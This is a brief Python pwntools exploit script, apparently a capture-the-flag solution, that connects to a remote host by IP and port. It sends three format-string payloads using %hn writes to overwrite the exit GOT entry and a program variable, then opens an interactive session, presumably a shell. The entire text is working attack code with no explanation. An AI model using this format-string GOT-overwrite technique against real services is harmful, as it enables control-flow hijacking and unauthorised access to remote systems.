from pwn import *

p = remote("34.121.19.183", 49156)

exit_got = 0x601048
var = 0x60108c

p.sendline("%9$1879p%9$hnAAAAAAAAAAA" + p64(exit_got))
p.sendline("%9$4919p%9$hnAAAAAAAAAAA" + p64(var))
p.sendline("%9$2074p%9$hnAAAAAAAAAAA" + p64(exit_got))
p.interactive()
